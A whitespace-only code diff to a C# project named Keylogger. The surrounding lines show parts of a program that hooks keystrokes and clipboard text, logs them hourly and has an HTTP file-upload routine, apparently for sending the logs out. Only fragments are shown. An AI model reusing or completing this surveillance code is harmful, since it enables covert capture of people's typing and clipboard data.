@@ -34,14 +34,12 @@ namespace Keylogger
             new Program().start();
         }
 
-
         private void start()
         {
             // Clipboard handler
             var clipboard = new SharpClipboard();
             clipboard.ObservableFormats.Texts = true;
             clipboard.ClipboardChanged += ClipboardChanged;
-
 
             // Key handler
             using (var api = new KeystrokeAPI())
@@ -89,7 +87,6 @@ namespace Keylogger
             return windowTitle;
         }
 
-        
         private void ClipboardChanged(Object sender, ClipboardChangedEventArgs e)
         {
             if (e.ContentType == SharpClipboard.ContentTypes.Text)
@@ -98,7 +95,6 @@ namespace Keylogger
             }
         }
         
-
         public void writeLogs()
         {
             // Write logs https://docs.microsoft.com/fr-fr/dotnet/standard/io/how-to-write-text-to-a-file
@@ -136,7 +132,6 @@ namespace Keylogger
             log = "";
             currentHour = DateTime.UtcNow.ToString("HH");
         }
-
 
         public static void HttpUploadFile(string url, string file, string paramName, string contentType, NameValueCollection nvc)
         {
